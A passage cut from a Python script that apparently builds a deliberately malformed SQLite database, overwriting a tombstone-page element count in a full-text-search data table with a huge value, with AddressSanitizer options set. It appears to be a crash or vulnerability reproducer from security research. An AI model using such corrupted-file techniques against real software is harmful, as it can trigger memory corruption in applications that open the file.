""".encode(), check=True,
env={**os.environ, "ASAN_OPTIONS": "detect_leaks=0"})

# Step 2: corrupt the tombstone-page nElem field (bytes 4-7) to 0x20000000.
# The tombstone page is the high-rowid t_data row whose header byte 0 is the
# tombstone marker (4 or 8) and byte 1 is 0 or 1.
conn = sqlite3.connect(OUT)
candidates = [r[0] for r in conn.execute("SELECT id FROM t_data").fetchall() if r[0] > 1_000_000_000_000]
